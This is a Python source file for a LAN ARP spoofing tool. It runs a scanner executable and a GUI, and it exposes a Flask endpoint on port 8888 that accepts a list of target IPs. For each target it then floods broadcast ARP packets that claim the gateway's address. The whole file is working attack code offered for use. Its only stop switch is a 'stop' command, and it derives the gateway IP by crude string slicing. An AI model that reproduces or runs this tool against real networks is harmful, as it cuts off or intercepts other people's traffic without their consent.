import flask,json
from flask import request
import os
import threading
from scapy.all import *

print("---------------开始扫描存活IP-----------------")
os.system('scan.exe')

bools = True

def start_GUI():
    os.system('GUI.exe')




def get_host_ip():
    """
    查询本机ip地址
    :return:
    """
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        lhost=s.getsockname()[0]
    finally:
        s.close()
    
    '''
    转换为网关IP
    '''

    gateway = str(lhost[:10]) + '1'

    
    #ip_list = []
    #ip_list.append(lhost,gatway)

    return gateway



def arpspoof(IP_list,gateway):
    print(IP_list)
    while bools:
        for ip in IP_list:
            
            pkt = Ether('ff:ff:ff:ff:ff:ff')/ARP(pdst=str(ip),psrc=str(gateway))
            sendp(pkt)
            print('send Ether/ARP ==> '+str(ip))
    return True




server = flask.Flask(__name__)
@server.route('/',methods=['get','post'])  #接收参数(GET/POST)
def get():
    global bools
    cmd = request.values.get('cmd')  #获取内容
    
    if cmd:
        if cmd == 'stop':  #停止
            bools = False
            resu={'code':200,'message':'ok'}
            return json.dumps(resu,ensure_ascii=False)
        
        else:
            cmd = cmd[:-1]
            IP_list = cmd.split('|') #获取目标IP列表
            gateway = get_host_ip() #获取网关
            t = threading.Thread(target=arpspoof,args=(IP_list,gateway)) #创建进程
            t.start()
            resu={'code':200,'message':'ok'}
            return json.dumps(resu,ensure_ascii=False)


if __name__== '__main__':
    t1 = threading.Thread(target=start_GUI) #创建进程
    t1.start()
    

    print('[*]service is start on 127.0.0.1:8888')
    server.run(port=8888,host='0.0.0.0')

